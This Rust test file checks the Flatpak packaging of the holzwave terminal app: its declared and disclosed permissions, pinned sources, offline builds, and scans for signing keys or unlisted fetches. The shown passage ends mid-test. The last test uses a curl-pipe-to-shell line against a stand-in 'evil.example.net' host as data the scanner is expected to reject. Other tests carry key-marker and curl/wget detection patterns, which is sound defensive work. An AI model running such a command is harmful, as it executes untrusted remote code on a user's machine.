//! The facts of the Flatpak files under `packaging/flatpak/` that a later change must not break by accident: the
//! application id is the Tauri identifier everywhere, the permission that removes the sandbox is asked for and
//! disclosed in the manifest and in the AppStream text, the network permission of the running app is asked for and
//! disclosed next to the line, in the AppStream text and on the page (and nothing broader is asked for), the build is
//! pinned, and nothing under `packaging/` holds a signing key or fetches from anywhere but the Zig archive.
//!
//! The files themselves are validated by the Flatpak toolchain in a Linux container (`sh scripts/build-flatpak.sh
//! --check`); that the Flatpak builds and runs is the owner's row L10 (`docs/test-plan.md`). The manifest is YAML
//! and the project has no YAML dependency (and gets none for this): its few facts are read line by line.
//!
//! Status: unverified. Flatpak ships in 0.0.1 only if it builds and row L10 passes; see `docs/flatpak.md`.

use std::path::{Path, PathBuf};

use serde_json::Value;

const MANIFEST: &str = include_str!("../../../packaging/flatpak/ch.holzcloud.holzwave.yml");
const METAINFO: &str = include_str!("../../../packaging/flatpak/ch.holzcloud.holzwave.metainfo.xml");
const DESKTOP: &str = include_str!("../../../packaging/flatpak/ch.holzcloud.holzwave.desktop");
const SCRIPT: &str = include_str!("../../../scripts/build-flatpak.sh");
const TAURI_CONF: &str = include_str!("../tauri.conf.json");
const FLATPAK_PAGE: &str = include_str!("../../../docs/flatpak.md");
const TEST_PLAN: &str = include_str!("../../../docs/test-plan.md");
const SUBMISSION_PAGE: &str = include_str!("../../../docs/flathub-submission.md");
const GENERATOR_PIN: &str = include_str!("../../../packaging/flatpak/generated/generator-pin.txt");

const HOST_PERMISSION: &str = "--talk-name=org.freedesktop.Flatpak";
const NETWORK_PERMISSION: &str = "--share=network";
const SSH_PERMISSION: &str = "--socket=ssh-auth";
const SECRETS_PERMISSION: &str = "--talk-name=org.freedesktop.secrets";

fn identifier() -> String {
    let conf: Value = serde_json::from_str(TAURI_CONF).expect("tauri.conf.json is JSON");
    conf["identifier"].as_str().expect("an identifier").to_owned()
}

fn version() -> String {
    let conf: Value = serde_json::from_str(TAURI_CONF).expect("tauri.conf.json is JSON");
    conf["version"].as_str().expect("a version").to_owned()
}

/// The value of the top-level scalar `key:` of the manifest.
fn manifest_scalar(key: &str) -> Option<String> {
    let prefix = format!("{key}:");
    MANIFEST
        .lines()
        .find_map(|line| line.strip_prefix(&prefix))
        .map(|value| value.trim().trim_matches('\'').trim_matches('"').to_owned())
}

/// The `- item` lines of the top-level list `key:` of the manifest, without the comment lines between them.
fn manifest_list(key: &str) -> Vec<String> {
    let header = format!("{key}:");
    let mut lines = MANIFEST.lines().skip_while(|line| *line != header);
    lines.next().expect("the list is in the manifest");
    lines
        .take_while(|line| line.starts_with(' ') || line.starts_with('#') || line.is_empty())
        .filter_map(|line| line.trim().strip_prefix("- ").map(|item| item.trim().to_owned()))
        .collect()
}

/// Lower case, every run of whitespace one space, trimmed: a line wrap cannot hide a phrase.
fn squashed(text: &str) -> String {
    text.to_lowercase().split_whitespace().collect::<Vec<_>>().join(" ")
}

/// The zero-based indexes of the manifest lines that are the item `- --share=network`.
fn network_items() -> Vec<usize> {
    MANIFEST.lines().enumerate().filter(|(_, line)| line.trim() == format!("- {NETWORK_PERMISSION}")).map(|(at, _)| at).collect()
}

/// The comment block directly above manifest line `line`, without the `#`, squashed.
fn comment_above(line: usize) -> String {
    let lines: Vec<&str> = MANIFEST.lines().collect();
    let mut block: Vec<&str> =
        lines[..line].iter().rev().take_while(|l| l.trim().starts_with('#')).map(|l| l.trim().trim_start_matches('#')).collect();
    block.reverse();
    squashed(&block.join(" "))
}

/// The text of `page` from the line that is `heading` up to, not including, the next line that starts with `## `.
fn a_section(page: &str, heading: &str) -> String {
    let mut lines = page.lines().skip_while(|line| *line != heading);
    assert!(lines.next().is_some(), "{heading} is not a heading of docs/flatpak.md");
    lines.take_while(|line| !line.starts_with("## ")).collect::<Vec<_>>().join("\n")
}

/// The comment block directly above the manifest item `- arg`, squashed.
fn comment_above_item(arg: &str) -> String {
    let at = MANIFEST.lines().position(|l| l.trim() == format!("- {arg}")).unwrap_or_else(|| panic!("{arg} is not a finish argument"));
    comment_above(at)
}

/// The AppStream file without its XML comments (what a validator and a store read; the comments are for the owner).
fn metainfo_elements() -> String {
    let mut out = String::new();
    let mut rest = METAINFO;
    while let Some(start) = rest.find("<!--") {
        out.push_str(&rest[..start]);
        let end = rest[start..].find("-->").expect("an XML comment is closed");
        rest = &rest[start + end + 3..];
    }
    out.push_str(rest);
    out
}

/// The XML comments of the AppStream file, squashed into one string.
fn metainfo_comments() -> String {
    let mut out = String::new();
    let mut rest = METAINFO;
    while let Some(start) = rest.find("<!--") {
        let end = rest[start..].find("-->").expect("an XML comment is closed");
        out.push(' ');
        out.push_str(&rest[start + 4..start + end]);
        rest = &rest[start + end + 3..];
    }
    squashed(&out)
}

/// The text of the `<description>` element of the AppStream file.
fn description() -> &'static str {
    METAINFO.split("<description>").nth(1).and_then(|d| d.split("</description>").next()).expect("a description")
}

#[test]
fn the_application_id_is_the_tauri_identifier_in_all_three_files_and_in_their_names() {
    let id = identifier();
    assert_eq!(id, "ch.holzcloud.holzwave", "the identifier is the application id on every platform");
    assert_eq!(manifest_scalar("app-id").as_deref(), Some(id.as_str()), "manifest app-id");
    assert!(METAINFO.contains(&format!("<id>{id}</id>")), "metainfo id");
    assert!(METAINFO.contains(&format!("<launchable type=\"desktop-id\">{id}.desktop</launchable>")), "metainfo launchable");
    assert!(DESKTOP.lines().any(|line| line == format!("Icon={id}")), "the desktop file's icon is named by the id");
    assert!(DESKTOP.lines().any(|line| line == format!("StartupWMClass={id}")), "the window class is the id");
    // The three files are named by the id, which Flatpak requires of the desktop file, the metainfo and the icons.
    let dir = packaging().join("flatpak");
    for name in [format!("{id}.yml"), format!("{id}.metainfo.xml"), format!("{id}.desktop")] {
        assert!(dir.join(&name).is_file(), "{name} is not in packaging/flatpak");
    }
    // The manifest installs them under the same names.
    for installed in [
        format!("/app/share/applications/{id}.desktop"),
        format!("/app/share/metainfo/{id}.metainfo.xml"),
        format!("/app/share/icons/hicolor/128x128/apps/{id}.png"),
    ] {
        assert!(MANIFEST.contains(&installed), "the manifest does not install {installed}");
    }
    assert!(METAINFO.contains(&format!("<release version=\"{}\"", version())), "the release entry is the current version");
}

#[test]
fn the_manifest_asks_for_the_host_command_permission_and_says_what_it_costs() {
    let args = manifest_list("finish-args");
    assert!(args.iter().any(|a| a == HOST_PERMISSION), "the host-command permission is missing: {args:?}");
    // The comment block right above the permission says that it removes the sandbox.
    let lines: Vec<&str> = MANIFEST.lines().collect();
    let at = lines.iter().position(|l| l.trim() == format!("- {HOST_PERMISSION}")).expect("the permission line");
    let comment: String = lines[..at]
        .iter()
        .rev()
        .take_while(|l| l.trim().starts_with('#'))
        .map(|l| l.to_lowercase())
        .collect();
    assert!(comment.contains("sandbox escape"), "no disclosure next to the permission");
    assert!(comment.contains("host"), "the disclosure does not say what runs on the host");
    // The metainfo description tells the user the same, in plain words.
    let description = METAINFO.split("<description>").nth(1).and_then(|d| d.split("</description>").next()).expect("a description");
    let text = description.to_lowercase();
    assert!(text.contains("commands on the host"), "the description does not mention host commands: {description}");
    assert!(text.contains("org.freedesktop.flatpak"), "the description does not name the permission");
    assert!(text.contains("sandbox"), "the description does not say that the sandbox is gone");
}

#[test]
fn the_permissions_are_exactly_the_documented_ones_and_the_network_is_one_of_them() {
    // Nine permissions. The last two are the SSH agent socket (the in-process SSH client reads it) and the Secret Service on the
    // session bus (the keychain of the Linux build speaks it); each is disclosed next to its line, in the AppStream text and in
    // the table of docs/flatpak.md (`every_finish_argument_is_in_the_page_table`).
    assert_eq!(
        manifest_list("finish-args"),
        [
            "--socket=wayland",
            "--socket=fallback-x11",
            "--share=ipc",
            NETWORK_PERMISSION,
            "--device=dri",
            "--filesystem=home",
            HOST_PERMISSION,
            SSH_PERMISSION,
            SECRETS_PERMISSION
        ],
        "a permission was added or removed: that is a decision; the Flatpak page (docs/flatpak.md) and the AppStream text must change with it"
    );
    // The network is named once as an item, as a finish argument of the running app. It was named a second time as a build
    // argument while the build fetched its sources; since every source is declared and hashed (see
    // `no_build_step_has_network_access_and_every_source_is_declared_and_pinned`), no module asks for it.
    let items = network_items();
    assert_eq!(items.len(), 1, "the network is named once, as a finish argument of the running app: {items:?}");
    let lines: Vec<&str> = MANIFEST.lines().collect();
    let finish = lines.iter().position(|l| *l == "finish-args:").expect("finish-args");
    let build_options = lines.iter().position(|l| *l == "build-options:").expect("the top-level build-options");
    assert!(finish < items[0] && items[0] < build_options, "the network item is not a finish argument");
}

#[test]
fn the_network_permission_is_disclosed_next_to_it_in_the_description_and_on_the_page() {
    let first = *network_items().first().expect("the network item of the running app");
    let comment = comment_above(first);
    for word in ["network", "ssh", "sync", "ai chat", "nothing connects at launch", "--unshare=network"] {
        assert!(comment.contains(word), "the comment above the network permission does not say {word:?}: {comment}");
    }
    let text = squashed(description());
    for word in ["network", "ssh", "sync", "ai chat", "telemetry"] {
        assert!(text.contains(word), "the AppStream description does not say {word:?}: {text}");
    }
    let page = squashed(FLATPAK_PAGE);
    assert!(page.contains(NETWORK_PERMISSION), "docs/flatpak.md does not name {NETWORK_PERMISSION}");
    for stale in ["the running app asks for no network permission", "as every graphical app. no network permission", "no network permission"] {
        assert!(!page.contains(stale), "docs/flatpak.md still says {stale:?}");
    }
    for claim in ["no network permission", "asks for no network"] {
        assert!(!squashed(MANIFEST).contains(claim) && !text.contains(claim), "the manifest or the AppStream text says {claim:?}");
    }
}

#[test]
fn the_page_says_what_connects_and_when() {
    let section = squashed(&a_section(FLATPAK_PAGE, "## What connects, and when"));
    for word in ["launch", "ssh", "sync", "ai chat", "local only", "telemetry", "--unshare=network", "--reset"] {
        assert!(section.contains(word), "the section of docs/flatpak.md on what connects does not say {word:?}");
    }
    let limits = squashed(&a_section(FLATPAK_PAGE, "## Known limits"));
    assert!(limits.contains("keychain"), "the known limits of docs/flatpak.md do not mention the keychain");
    let headings: Vec<&str> = FLATPAK_PAGE.lines().filter(|l| l.starts_with("## ")).collect();
    let at = |heading: &str| headings.iter().position(|h| *h == heading).unwrap_or_else(|| panic!("{heading} is missing"));
    assert!(
        at("## What it costs in sandboxing") + 1 == at("## What connects, and when")
            && at("## What connects, and when") + 1 == at("## How the shell is started"),
        "the section on what connects lies between the cost list and the shell: {headings:?}"
    );
}

#[test]
fn the_test_plan_row_for_the_flatpak_runs_the_network_checks() {
    let row = TEST_PLAN.lines().find(|l| l.starts_with("| L10 |")).expect("row L10 of docs/test-plan.md");
    assert_eq!(row.matches('|').count(), 6, "row L10 has five cells and no pipe character inside one: {row}");
    assert!(row.trim_end().ends_with("|  |") || row.trim_end().ends_with("| |"), "the Result cell of L10 is not empty: nothing is verified yet");
    let text = squashed(row);
    for word in ["ships a flatpak: install it, run it", "flatpak info --show-permissions", "ss -tnp", "holzwave-app", "--unshare=network", "--reset"] {
        assert!(text.contains(word), "row L10 does not say {word:?}");
    }
}

#[test]
fn the_runtime_the_extensions_and_the_zig_archive_are_pinned() {
    assert_eq!(manifest_scalar("runtime").as_deref(), Some("org.gnome.Platform"));
    assert_eq!(manifest_scalar("sdk").as_deref(), Some("org.gnome.Sdk"));
    let version = manifest_scalar("runtime-version").expect("a runtime version");
    assert!(version.chars().all(|c| c.is_ascii_digit()), "a GNOME runtime branch is a number: {version}");
    assert!(
        version.parse::<u32>().expect("a number") >= 49,
        "the Tauri guide's 46 and 47 are stale; the runtime is the newest stable one"
    );
    assert_eq!(
        manifest_list("sdk-extensions"),
        ["org.freedesktop.Sdk.Extension.rust-stable", "org.freedesktop.Sdk.Extension.node26"]
    );
    assert_eq!(manifest_scalar("command").as_deref(), Some("holzwave-app"), "the binary Tauri builds");
    // Every archive is Zig 0.17.1 (the pinned Ghostty commit requires it), from ziglang.org, with its sha256 in the next line. The
    // manifest names one more address, the Ghostty git source, which is pinned by a commit (checked below); every other
    // source is a generated file that is included by name.
    let lines: Vec<&str> = MANIFEST.lines().collect();
    let urls: Vec<usize> = (0..lines.len()).filter(|&i| lines[i].trim().starts_with("url:")).collect();
    let zig: Vec<usize> = urls.iter().copied().filter(|&i| lines[i].contains("ziglang.org")).collect();
    assert_eq!(zig.len(), 2, "one Zig archive per architecture");
    assert_eq!(urls.len(), 3, "the two Zig archives and the Ghostty checkout are the only addresses the manifest names");
    for i in zig {
        let url = lines[i].trim().trim_start_matches("url:").trim();
        assert!(url.starts_with("https://ziglang.org/download/0.17.1/zig-"), "{url}");
        assert!(url.ends_with("-linux-0.17.1.tar.xz"), "{url}");
        let sha = lines[i + 1].trim().strip_prefix("sha256:").map(str::trim).expect("the sha256 follows the url");
        assert!(sha.len() == 64 && sha.chars().all(|c| matches!(c, '0'..='9' | 'a'..='f')), "{sha}");
    }
    let arches: Vec<&str> = lines.iter().filter(|l| l.contains("only-arches:")).map(|l| l.trim()).collect();
    assert_eq!(arches, ["only-arches: [x86_64]", "only-arches: [aarch64]"], "both architectures are declared, on the Zig archives only");
}

const GHOSTTY_PIN: &str = include_str!("../../../packaging/flatpak/generated/ghostty-pin.txt");
const APP_COMMAND: &str = include_str!("../../../packaging/flatpak/generated/app-build-command.txt");

/// The lines of the `holzwave` module (from its `- name: holzwave` line to the end of the file, it is the last module).
fn holzwave_module() -> Vec<&'static str> {
    let lines: Vec<&str> = MANIFEST.lines().collect();
    let at = lines.iter().position(|l| *l == "  - name: holzwave").expect("the holzwave module");
    lines[at..].to_vec()
}

/// The `- command` items of the `build-commands:` list of the `holzwave` module.
fn holzwave_build_commands() -> Vec<String> {
    let module = holzwave_module();
    let at = module.iter().position(|l| l.trim() == "build-commands:").expect("the build commands");
    module[at + 1..].iter().filter_map(|l| l.trim().strip_prefix("- ")).map(str::to_owned).collect()
}

/// The text of the `- type: <kind>` source blocks of the holzwave module: each block runs to the next `      - ` item or the
/// end of the sources.
fn holzwave_sources() -> Vec<Vec<&'static str>> {
    let module = holzwave_module();
    let start = module.iter().position(|l| l.trim() == "sources:").expect("the sources") + 1;
    let end = module.iter().position(|l| l.trim() == "build-commands:").expect("the build commands");
    let mut blocks: Vec<Vec<&str>> = Vec::new();
    for line in &module[start..end] {
        if line.trim().is_empty() || line.trim().starts_with('#') {
            continue;
        }
        if line.starts_with("      - ") {
            blocks.push(vec![line]);
        } else {
            blocks.last_mut().expect("a block").push(line);
        }
    }
    blocks
}

#[test]
fn no_build_step_has_network_access_and_every_source_is_declared_and_pinned() {
    // Test reason (this test replaces the old assertion that the build module asked for the network): no module of the
    // manifest has build arguments at all, and the network appears once, as a finish argument of the running app.
    assert!(!MANIFEST.contains("build-args"), "a module asks for build arguments (the build network is one of them)");
    assert!(!MANIFEST.lines().any(|l| l.contains("--share=network") && !l.trim().starts_with('#') && l.trim() != "- --share=network"), "the network is named in another way");
    assert_eq!(network_items().len(), 1, "the network is a finish argument and nothing else");
    // Every source of the holzwave module is one of: the local directory (marked), the Ghostty git source at a commit, or a
    // generated file included by name.
    let blocks = holzwave_sources();
    assert_eq!(blocks.len(), 5, "the directory, the Ghostty checkout and the three generated files: {blocks:?}");
    let mut dirs = 0;
    let mut gits = 0;
    let mut included = Vec::new();
    for block in &blocks {
        let first = block[0].trim().trim_start_matches("- ");
        if first == "type: dir" {
            dirs += 1;
        } else if first == "type: git" {
            gits += 1;
            let text = block.join("\n");
            assert!(text.contains("url: https://github.com/ghostty-org/ghostty.git"), "the git source is the Ghostty repository: {text}");
            let commit = block.iter().find_map(|l| l.trim().strip_prefix("commit:")).map(str::trim).expect("a commit");
            assert!(commit.len() == 40 && commit.chars().all(|c| matches!(c, '0'..='9' | 'a'..='f')), "the git source is pinned by a full commit: {commit}");
            assert!(!text.contains("branch:") && !text.contains("tag:"), "a git source is pinned by its commit, not a branch: {text}");
        } else if let Some(file) = first.strip_prefix("generated/") {
            included.push(file.to_owned());
            assert!(first.ends_with(".json") && block.len() == 1, "an included source is a plain file name: {block:?}");
            assert!(packaging().join("flatpak").join(first).is_file(), "{first} is included but does not exist");
        } else {
            panic!("a source that is neither the local directory, the Ghostty checkout nor a generated file: {block:?}");
        }
    }
    assert_eq!((dirs, gits), (1, 1), "one local directory and one git source");
    assert_eq!(included, ["zig-sources.json", "cargo-sources.json", "node-sources.json"], "the three generated files, in this order");
    // The one `dir` source is the local recipe's and says what the owner replaces it with.
    let at = MANIFEST.lines().position(|l| l.trim() == "- type: dir").expect("the dir source");
    let comment = comment_above(at);
    for word in ["local recipe only", "git", "submission", "tag", "commit", "no tag or commit is written here"] {
        assert!(comment.contains(word), "the comment above the dir source does not say {word:?}: {comment}");
    }
    // The Zig compiler module has only archives with a sha256 each (the other test pins the version).
    let lines: Vec<&str> = MANIFEST.lines().collect();
    let archives = lines.iter().filter(|l| l.trim() == "- type: archive").count();
    assert_eq!(archives, 2, "the Zig archives are the manifest's only archive sources");
    // No generated source file is hand-written: each is covered by the tests of its own file, and the pin file names the tool.
    assert!(GENERATOR_PIN.contains("flatpak-builder-tools-commit="), "the generated files come from a pinned tool");
}

#[test]
fn the_holzwave_module_builds_with_the_recorded_command_offline_and_fetches_nothing() {
    let commands = holzwave_build_commands();
    // The cargo command is the one the earlier tracer recorded, character for character.
    let recorded: Vec<&str> = APP_COMMAND.lines().filter(|l| !l.trim().is_empty() && !l.starts_with('#')).collect();
    assert_eq!(recorded.len(), 1, "one recorded command");
    assert!(commands.iter().any(|c| c == recorded[0]), "the manifest does not run the recorded command {:?}: {commands:?}", recorded[0]);
    assert!(recorded[0].contains("cargo build --locked") && recorded[0].contains("--release") && recorded[0].contains("--offline") && recorded[0].contains("-p holzwave-app"));
    assert!(recorded[0].contains("--features tauri/custom-protocol"), "the feature that embeds the page: without it the app is a development build");
    // The page build and the package install read the declared sources only.
    assert!(commands.iter().any(|c| c == "npm --prefix app ci --offline --ignore-scripts --no-audit --no-fund"), "the offline install without scripts: {commands:?}");
    assert!(commands.iter().any(|c| c == "npm --prefix app run build"), "the page build");
    let position = |wanted: &str| commands.iter().position(|c| c.starts_with(wanted)).unwrap_or_else(|| panic!("{wanted} is missing"));
    assert!(
        position("npm --prefix app ci") < position("npm --prefix app run build") && position("npm --prefix app run build") < position("cargo build"),
        "the order: install the packages, build the page (the app embeds it), build the app"
    );
    // Nothing reaches for a registry.
    for command in &commands {
        assert!(!command.contains("npm install") && !command.contains("cargo fetch") && !command.contains("curl") && !command.contains("wget"), "a command that fetches: {command}");
        if command.starts_with("npm ") && command.contains(" ci") {
            assert!(command.contains("--offline"), "an npm install that may use the network: {command}");
        }
        if command.starts_with("cargo ") {
            assert!(command.contains("--offline") && command.contains("--locked"), "a cargo command that may use the network or change the lock file: {command}");
        }
    }
    // The environment names the app command file lists are all set, to folders that the declared sources fill.
    let module = holzwave_module().join("\n");
    let global = MANIFEST.split("\nmodules:").next().expect("the top of the manifest");
    for (name, value) in [
        ("GHOSTTY_SOURCE_DIR", "/run/build/holzwave/ghostty"),
        ("GHOSTTY_ZIG_SYSTEM_DIR", "/run/build/holzwave/zig-pkgs"),
        ("ZIG", "/app/opt/zig/zig"),
    ] {
        assert!(module.contains(&format!("{name}: {value}")), "the module does not set {name}: {value}");
    }
    assert!(global.contains("CARGO_HOME: /run/build/holzwave/cargo"), "the cargo home is where cargo-sources.json lays out the vendor folder and configuration");
    assert!(global.contains("CARGO_NET_OFFLINE: 'true'"), "cargo is told to stay offline");
    assert!(global.contains("npm_config_cache: /run/build/holzwave/flatpak-node/npm-cache"), "the npm cache is where node-sources.json lays it out");
    // The destinations of the generated files lie below the folders the environment points at.
    let dests = |text: &str, folder: &str| {
        let entries: Vec<Value> = serde_json::from_str(text).expect("JSON");
        entries.iter().filter(|e| e["type"] == "archive" || e["type"] == "git").all(|e| e["dest"].as_str().is_some_and(|d| d.starts_with(folder)))
    };
    assert!(dests(include_str!("../../../packaging/flatpak/generated/zig-sources.json"), "zig-pkgs/"), "the Zig packages go below zig-pkgs/");
    // The Zig compiler is a build tool of its own module and does not stay in the app.
    assert!(MANIFEST.contains("- /opt/zig"), "the Zig module is cleaned up");
}

#[test]
fn the_ghostty_commit_of_the_manifest_is_the_one_of_the_pin_file() {
    let pinned = GHOSTTY_PIN.lines().find_map(|l| l.strip_prefix("ghostty-commit=")).expect("a commit in ghostty-pin.txt");
    let repository = GHOSTTY_PIN.lines().find_map(|l| l.strip_prefix("ghostty-repository=")).expect("a repository in ghostty-pin.txt");
    assert!(MANIFEST.lines().any(|l| l.trim() == format!("commit: {pinned}")), "the manifest's Ghostty commit is not {pinned}");
    assert!(MANIFEST.lines().any(|l| l.trim() == format!("url: {repository}")), "the manifest's Ghostty repository is not {repository}");
}

#[test]
fn the_header_says_it_is_a_reference_and_not_a_submission() {
    let header = squashed(&MANIFEST.lines().take_while(|l| l.starts_with('#')).map(|l| l.trim_start_matches('#')).collect::<Vec<_>>().join(" "));
    for statement in [
        "a reference for the owner to read",
        "the owner writes and submits the flathub manifest by hand",
        "does not accept a manifest or a pull request written by an ai agent",
        "holzwave is built with ai help and says so",
        "no agent opens, prepares or automates a submission",
        "unverified until the owner's run",
        "x86_64 is built only by flathub and is untried here",
        "never started on any desktop",
    ] {
        assert!(header.contains(statement), "the header of the manifest does not say {statement:?}");
    }
    // No label of the private planning tree in this public file: no plan id, threat id or decision id.
    for (at, _) in MANIFEST.match_indices("13-") {
        let digits = MANIFEST[at + 3..].chars().take(2).all(|c| c.is_ascii_digit());
        let before = MANIFEST[..at].chars().next_back().is_some_and(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-');
        assert!(!digits || before, "a plan label in the manifest: {}", &MANIFEST[at..at + 5]);
    }
    assert!(!MANIFEST.contains("T-13-") && !MANIFEST.contains("D-0") && !MANIFEST.contains("D-1"), "a threat or decision label in the manifest");
}

#[test]
fn the_desktop_file_is_a_terminal_in_the_system_category() {
    assert!(DESKTOP.lines().any(|l| l == "Categories=System;TerminalEmulator;"), "the category line");
    assert!(DESKTOP.lines().any(|l| l.starts_with("Keywords=") && l.contains("terminal")), "keywords");
    assert!(DESKTOP.lines().any(|l| l == "Exec=holzwave-app"), "the command of the manifest");
    assert!(DESKTOP.lines().any(|l| l == "Type=Application"));
}

fn packaging() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../packaging")
}

fn files_under(dir: &Path, found: &mut Vec<PathBuf>) {
    for entry in std::fs::read_dir(dir).expect("read packaging") {
        let path = entry.expect("entry").path();
        if path.is_dir() {
            files_under(&path, found);
        } else {
            found.push(path);
        }
    }
}

/// The addresses in `text` that start with a scheme.
fn urls_in(text: &str) -> Vec<String> {
    let mut found = Vec::new();
    for scheme in ["https://", "http://", "ftp://", "git://", "ssh://"] {
        for (at, _) in text.match_indices(scheme) {
            let end = text[at..].find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '<' | '>' | ')')).map_or(text.len(), |e| at + e);
            found.push(text[at..end].to_owned());
        }
    }
    found
}

/// The addresses in `text` that something retrieves. A fetch is a statement (continuation lines joined) that runs `curl` or
/// `wget` or starts with `ADD`, or a `url:` field of a manifest. Comments, labels, chart metadata and example values are
/// not fetches and are not looked at. The skip is by context only, never by host.
fn fetched_urls(text: &str) -> Vec<String> {
    let mut found = Vec::new();
    let mut statement = String::new();
    let flush = |statement: &mut String, found: &mut Vec<String>| {
        let s = statement.trim();
        let fetches = s.starts_with("ADD ")
            || s.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-')).any(|w| w == "curl" || w == "wget");
        if fetches {
            found.extend(urls_in(s));
        }
        statement.clear();
    };
    for line in text.lines() {
        let t = line.trim();
        if t.starts_with('#') {
            continue;
        }
        let field = t.trim_start_matches("- ").trim_start_matches('"');
        if field.starts_with("url:") || field.starts_with("url\":") {
            found.extend(urls_in(t));
        }
        match t.strip_suffix('\\') {
            Some(rest) => {
                statement.push_str(rest);
                statement.push(' ');
            }
            None => {
                statement.push_str(t);
                flush(&mut statement, &mut found);
            }
        }
    }
    flush(&mut statement, &mut found);
    found
}

/// The one address besides the Zig archive that the packaging may fetch from: the pinned `rustup-init` of the server image.
const RUSTUP_INIT_URL: &str = "https://static.rust-lang.org/rustup/archive/${RUSTUP_VERSION}/${triple}";

/// Whether `url` in a file with this `text` is allowed. The rustup-init address counts only when the same file pins the
/// rustup version (`ARG RUSTUP_VERSION=` with a plain x.y.z) and checks the download against a sha256 with `sha256sum -c`.
fn allowed_source(url: &str, text: &str) -> bool {
    if url.starts_with("https://ziglang.org/download/") || url == "https://holzcloud.ch/holzwave" {
        return true;
    }
    if url != RUSTUP_INIT_URL {
        return false;
    }
    let pinned = text.lines().any(|l| {
        l.trim().strip_prefix("ARG RUSTUP_VERSION=").is_some_and(|v| {
            let parts: Vec<&str> = v.split('.').collect();
            parts.len() == 3 && parts.iter().all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()))
        })
    });
    pinned && text.contains("sha256sum -c")
}

/// Whether `file` is a JSON file below `packaging/flatpak/generated/` whose `text` is an array in which every entry is either a
/// fetch that is pinned by content, or text that fetches nothing. A fetch has a `url` and carries a sha256 (64 lower-case hex
/// digits), a sha512 (128) or, for a git source, a 40-character commit. An `inline` entry (a file the tool writes: the checksum
/// files cargo wants, the vendoring configuration, the npm cache index) has no `url`, and a `script` or `shell` entry (copy
/// commands) has none either and its commands do not run `curl` or `wget` and name no address. Such a file is the output of the
/// source tools (`scripts/flatpak-zig-sources.sh`, `scripts/flatpak-generate-sources.sh`): its `url` fields are fetches, and each
/// is pinned by content, so none of them needs to be listed by host. An entry without a pin, a pin of another length, an entry that
/// fetches by another way, or a file that is not such an array fails. The rule is by context (the folder, the file kind and the
/// pins), never by host.
fn generated_sources_are_pinned(file: &Path, text: &str) -> bool {
    let hex = |value: Option<&Value>, length: usize| {
        value.and_then(Value::as_str).is_some_and(|v| v.len() == length && v.chars().all(|c| matches!(c, '0'..='9' | 'a'..='f')))
    };
    let in_generated_folder = file.starts_with(packaging().join("flatpak").join("generated")) && file.extension().is_some_and(|e| e == "json");
    let Ok(Value::Array(entries)) = serde_json::from_str::<Value>(text) else {
        return false;
    };
    let fetches_nothing = |entry: &Value| match entry.get("type").and_then(Value::as_str) {
        Some("inline") => entry.get("url").is_none() && entry.get("commands").is_none(),
        Some("script" | "shell") => {
            let commands = entry.get("commands").and_then(Value::as_array);
            entry.get("url").is_none()
                && commands.is_some_and(|c| {
                    c.iter().all(|command| {
                        let command = command.as_str().unwrap_or("://");
                        !command.contains("://")
                            && !command.split(|ch: char| !(ch.is_ascii_alphanumeric() || ch == '_' || ch == '-')).any(|w| matches!(w, "curl" | "wget"))
                    })
                })
        }
        _ => false,
    };
    let pinned_fetch = |entry: &Value| {
        entry.get("url").is_some() && (hex(entry.get("sha256"), 64) || hex(entry.get("sha512"), 128) || hex(entry.get("commit"), 40))
    };
    in_generated_folder && !entries.is_empty() && entries.iter().all(|entry| pinned_fetch(entry) || fetches_nothing(entry))
}

/// The addresses of the `git` sources of a manifest that are pinned by a full commit: a `- type: git` item whose fields hold a
/// `url:` and a `commit:` of 40 lower-case hex digits and no `branch:` or `tag:`. A git source pinned in this way is fetched by
/// content, as a hashed archive is. The scan is by the shape of the item, never by host.
fn pinned_git_sources(text: &str) -> Vec<String> {
    let lines: Vec<&str> = text.lines().collect();
    let indent = |line: &str| line.len() - line.trim_start().len();
    let mut found = Vec::new();
    for (at, line) in lines.iter().enumerate() {
        if line.trim() != "- type: git" {
            continue;
        }
        let (mut url, mut commit, mut floating) = (None, None, false);
        for next in &lines[at + 1..] {
            let t = next.trim();
            if t.is_empty() || t.starts_with('#') {
                continue;
            }
            if indent(next) <= indent(line) {
                break;
            }
            if let Some(value) = t.strip_prefix("url:") {
                url = Some(value.trim().to_owned());
            } else if let Some(value) = t.strip_prefix("commit:") {
                commit = Some(value.trim().to_owned());
            } else if t.starts_with("branch:") || t.starts_with("tag:") {
                floating = true;
            }
        }
        let full = commit.as_deref().is_some_and(|c| c.len() == 40 && c.chars().all(|ch| matches!(ch, '0'..='9' | 'a'..='f')));
        if let (Some(url), true, false) = (url, full, floating) {
            found.push(url);
        }
    }
    found
}

/// The fetched addresses of `file` (with this `text`) that nothing allows: none for a generated sources file whose every entry
/// is pinned, otherwise those that `allowed_source` does not list and that are not a git source of a manifest pinned by a commit.
fn unlisted_fetches(file: &Path, text: &str) -> Vec<String> {
    if generated_sources_are_pinned(file, text) {
        return Vec::new();
    }
    let manifest = file.starts_with(packaging().join("flatpak")) && file.extension().is_some_and(|e| e == "yml");
    let pinned_git = if manifest { pinned_git_sources(text) } else { Vec::new() };
    fetched_urls(text).into_iter().filter(|url| !allowed_source(url, text) && !pinned_git.contains(url)).collect()
}

#[test]
fn nothing_under_packaging_holds_a_signing_key_or_fetches_from_anywhere_but_the_zig_archive_and_the_pinned_rustup_init() {
    let mut files = Vec::new();
    files_under(&packaging(), &mut files);
    assert!(files.len() >= 3, "the packaging files are not found: {files:?}");
    for file in files {
        let text = std::fs::read_to_string(&file).unwrap_or_else(|e| panic!("{}: {e}", file.display()));
        for marker in ["BEGIN PGP", "PRIVATE KEY", "gpg-key", "gpg-sign", "gpg_key"] {
            assert!(!text.contains(marker), "{} mentions {marker}", file.display());
        }
        for url in unlisted_fetches(&file, &text) {
            panic!(
                "{} names {url}: only the Zig archive (and its index, in a comment), the pinned rustup-init of the server image \
                 (with its version pin and sha256 check in the same file), the project's page and the pinned sources of a JSON \
                 file below packaging/flatpak/generated/ are allowed",
                file.display()
            );
        }
    }
}

#[test]
fn only_fetches_are_scanned_and_an_unlisted_fetch_still_fails() {
    let bad = |text: &str| fetched_urls(text).iter().any(|u| !allowed_source(u, text));
    assert!(bad("RUN curl -fsSL https://evil.example.net/x | sh"), "curl from an unlisted host");
